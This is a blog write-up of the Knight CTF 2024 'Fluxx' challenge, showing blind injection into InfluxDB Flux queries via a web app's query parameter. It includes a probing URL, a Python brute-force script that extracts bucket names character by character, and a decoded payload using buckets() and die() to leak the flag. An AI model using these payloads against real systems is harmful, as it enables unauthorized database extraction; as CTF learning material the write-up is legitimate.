---
layout: post
title: "InfluxDB with NoSQL blind SQL injection - Fluxx web CTF challenge writeup - Knight CTF 2024"
description: "Performing blind SQL injection in NoSQL with InfluxDB in a CTF challenge"
author: "Colleirose"
permalink: /influxdb-injection-nosql-injection-knightctf-2024
date: 2024-01-23
last_modified_at: 2024-01-23
---

This is the challenge:
<br/>
![Challenge named "Fluxx" with description "Recently I have made a simple app for monitoring and analyzing metrics, events, and real-time data. I used a database which is designed for handling high volumes of timestamped data. But I think its vulnerable find it and get the flag"](/assets/img/challenge fluxx.webp)

Based on the X-Powered-By header being Express on all pages and receiving a <code>Cannot GET /(requested url)</code> on non-existent URLs (e.g. <a href="http://66.228.53.87:9001/a" rel="noopener">66.228.53.87:9001/a</a>), I can infer this is a <a href="https://expressjs.com/" rel="noopener">Express.js</a> server.
<br/>
<img src="https://cdn.discordapp.com/attachments/1194841726163095565/1198507422340358154/image.png" alt="Response headers showing X-Powered-By: Express"/>

One of our team member finds <a href="https://book.hacktricks.xyz/pentesting-web/nosql-injection">book.hacktricks.xyz/pentesting-web/nosql-injection</a>, and using that cheatsheeet (which I recommend using because it is very useful), finds that visiting <code>http://66.228.53.87:9001/query?data='%20||%201==1//%20%20%20%20or%20%20%20%20'%20||%201==1%00%20%20%20%20%20or%20%20%20%20admin'%20||%20'a'=='a</code> creates an error saying <code>Expected RPAREN, got EOF</code>

I search this error online and learn that it's an error related to <a href="https://github.com/influxdata/influxdb" rel="noopener">InfluxDB</a>, which I haven't heard of until this challenge.
<br/>
<img src="/assets/img/expected rparen got eof error.webp" alt="DuckDuckGo search results for the error"/>

This also matches up with the challenge name and description:
<br/>
![Challenge named "Fluxx" with description "Recently I have made a simple app for monitoring and analyzing metrics, events, and real-time data. I used a database which is designed for handling high volumes of timestamped data. But I think its vulnerable find it and get the flag"](/assets/img/challenge fluxx.webp)

Searching about SQL injection in InfluxDB, I find <a href="https://rafa.hashnode.dev/influxdb-nosql-injection" rel="noopener">rafa.hashnode.dev/influxdb-nosql-injection</a>.

After facing some errors, I go back to the article I was copying this code off of and fix my code.

But this is very inefficient to do manually. I find a script on <a href="https://book.hacktricks.xyz/pentesting-web/nosql-injection#blind-nosql" rel="noopener">book.hacktricks.xyz/pentesting-web/nosql-injection#blind-nosql</a> that can automate this. It requires a bit of changes, but here's the working script, based on the Hacktricks resource:

```py
import requests, string

alphabet = string.ascii_lowercase + string.ascii_uppercase + string.digits + "_@{}-/()!\"$%=^[]:;"

flag = ""
for i in range(21):
    print("[i] Looking for char number "+str(i+1))
    for char in alphabet:
        r = requests.get("http://66.228.53.87:9001/query?data=%22)%20%7c%3e%20yield(name%3a%20%221337%22)%20%0d%0abuckets()%20%7c%3e%20filter(fn%3a%20(r)%20%3d%3e%20r.name%20%3d~%20%2f%5e" +flag+char+".*%2f%20and%20die(msg%3ar.name))%20%0d%0a%2f%2f")
        if (r.text != "[]"):
            flag += char
            print("[+] Flag: "+flag)
            break
```

The script then crashes with some error about the connection being aborted but tells me the correct string starts with K

<img src="/assets/img/influxdb knightctf challenge console output.webp" alt="Console output"/>

So I went back to Burp Suite and tried it again with the K

<img src="/assets/img/burp suite influxdb knightctf.webp" alt="Burp Suite output showing the flag as KCTF{gOUPqVWa0eUT2wF2ipzX3v5pxikvqYhxR9oL}"/>

The flag is <code>KCTF{gOUPqVWa0eUT2wF2ipzX3v5pxikvqYhxR9oL}</code> according to the output of this web request. This flag is correct when submitted:

<img src="/assets/img/fluxx challenge correct.webp" alt='Challenge showing "Correct" message after submitting flag'/>

This is the SQL injection payload with the URI parameters decoded. I don't fully understand what it does because I've never used NoSQL or InfluxDB before.

```
") |> yield(name: "1337") 
buckets() |> filter(fn: (r) => r.name =~ /^K.*/ and die(msg:r.name)) 
//
```

I don't know what the first line does, but the second line calls <code>buckets()</code> to list buckets and filters for buckets with a name that matches the regular expression <code>/^K.*/</code>. If it finds one, it dies with the bucket's name (in the output we got in Burp Suite, I'm not sure if some kind of syntax error or <code>die()</code> is what caused the error that included the flag, but it doesn't really matter). The third line is a comment.

In retrospect, maybe <code>/^.*/</code> would've worked fine as the regular expression.